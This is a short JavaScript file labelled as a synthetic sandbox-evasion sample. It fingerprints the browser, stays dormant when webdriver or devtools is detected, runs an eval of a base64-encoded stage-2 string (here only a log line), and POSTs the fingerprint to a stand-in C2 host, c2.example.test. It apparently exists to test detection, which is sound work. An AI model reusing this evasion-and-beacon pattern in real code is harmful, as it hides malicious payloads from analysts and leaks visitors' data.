// SANDBOXGHOST — synthetic sandbox-evasion product sample.
(function () {
  var C2 = 'https://c2.example.test/evasion';
  var signals = {
    visibility: document.visibilityState,
    hasFocus: document.hasFocus ? document.hasFocus() : true,
    webdriver: navigator.webdriver,
    devtools: window.outerWidth - window.innerWidth > 160 || window.outerHeight - window.innerHeight > 160,
    touch: navigator.maxTouchPoints
  };
  console.log('[SANDBOXGHOST] signals', JSON.stringify(signals));

  var interacted = false;
  ['pointerdown', 'mousemove', 'keydown'].forEach(function (type) {
    document.addEventListener(type, function () { interacted = true; }, true);
  });

  function stage2() {
    var suspicious = signals.webdriver === true || signals.devtools === true;
    if (suspicious) {
      console.log('[SANDBOXGHOST] analysis detected, staying dormant');
      return;
    }
    try { eval(atob('Y29uc29sZS5sb2coJ1tTQU5EQk9YR0hPU1RdIHN0YWdlLTIgcGF5bG9hZCBleGVjdXRlZCcp')); } catch (error) {}
    try {
      fetch(C2, { method: 'POST', body: btoa(JSON.stringify({ signals: signals, interacted: interacted })) }).catch(function () {});
    } catch (error) {}
    try { localStorage.setItem('sandboxghost:stage', '2'); } catch (error) {}
    console.log('[SANDBOXGHOST] stage-2 released', interacted);
  }

  setTimeout(stage2, 900);
  setTimeout(function () { interacted = true; }, 300);
})();
